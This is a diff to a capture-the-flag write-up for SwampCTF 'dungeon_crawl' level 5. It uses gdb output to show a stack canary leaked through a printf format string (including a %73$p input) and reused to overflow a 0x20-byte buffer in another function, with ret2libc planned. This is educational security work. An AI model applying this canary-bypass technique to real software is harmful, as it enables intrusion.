@@ -588,7 +588,21 @@ Breakpoint 2, 0x0000000000400aaa in format_string ()
 => 0x0000000000400aaa <format_string+74>:	64 48 33 04 25 28 00 00 00	xor    rax,QWORD PTR fs:0x28
 (gdb) 
 ```
-`2c7dc6248a7eac00` is the value printed out by `printf`. `$3 = 0x2c7dc6248a7eac00` is the value of `rax` after the instruction `mov    rax,QWORD PTR [rsp+0x208]` is executed. `0x7fffffffdc48:	0x8a7eac00	0x2c7dc624` is the memory dump of the stack canary itself. Since the memory dump shows the same value printed by `printf`, we know our format string is correct. We will use that value in our exploit input so that we will not change the stack canary's value, thereby bypassing the stack protection. This means we are free to override the return address from `<format_string>`.
+`2c7dc6248a7eac00` is the value printed out by `printf`. `$3 = 0x2c7dc6248a7eac00` is the value of `rax` after the instruction `mov    rax,QWORD PTR [rsp+0x208]` is executed. `0x7fffffffdc48:	0x8a7eac00	0x2c7dc624` is the memory dump of the stack canary itself. Since the memory dump shows the same value printed by `printf`, we know our format string is correct. We will use that value in our exploit input so that we will not change the stack canary's value, thereby bypassing the stack protection. This means we are free to override the return address from `<format_string>`. Unfortunately, `<fgets>` in `<format_string>` prevents buffer overflow by limiting user input to only 0x1ff characters.
+```
+0x0000000000400a8b <+43>:	mov    esi,0x1ff
+0x0000000000400a90 <+48>:	mov    rdi,rsp
+0x0000000000400a93 <+51>:	call   0x400780 <fgets@plt>
+```
+The door may be locked, but we can climb in through the window. Instead of overriding the return address of `<format_string>`, we override the return address of `<overflow_small>`. It provides a buffer 0x20 characters large, but reads 0x40 characters, so a buffer overflow here is possible. 
+```
+Breakpoint 4, 0x00000000004009dc in overflow_small ()
+=> 0x00000000004009dc <overflow_small+60>:	e8 2f fd ff ff	call   0x400710 <fread@plt>
+(gdb) info registers
+[...]
+rdx            0x40	64
+```
+Best part of it all is that the value of the stack canaries in `<overflow_small>` and `<format_string>` comes from the same source `QWORD PTR fs:0x28`. We can use the value of the stack canary we read in `<format_string>` in our stack smashing exploit using function `<overflow_small>`.
 
 Because the stack is not executable, we shall use the good old ROP to ret2libc. This is the pseudocode of what we will do to obtain a shell. This ROP chain contains 3 ROP gadgets.
 ```
@@ -598,24 +612,4 @@ Because the stack is not executable, we shall use the good old ROP to ret2libc. 
 ```
 
 To be continued...
-```
-(gdb) x/2xw $rsp+0x218
-0x7fffffffdc58:	0x00400819	0x00000000
-(gdb) x/2xw $rsp+0x208
-0x7fffffffdc48:	0x95c67500	0x6dee953e
-(gdb) c
-Continuing.
-[Inferior 1 (process 11770) exited with code 016]
-Error while running hook_stop:
-No registers.
-(gdb) r
-Starting program: /home/solomonbstoner/Desktop/CTF unsorted and disorganised/SwampCTF/dungeon_crawl/level5 
------ LEVEL 5 -----
-This is your final task - defeat this level and you will be rewarded.
-Choose your path to victory...
 
-Choice [0 exit][1 small][2 large][3 format]: 3
-Path 3 - The possibilities are endless!
-%73$p
-0x400819
-```
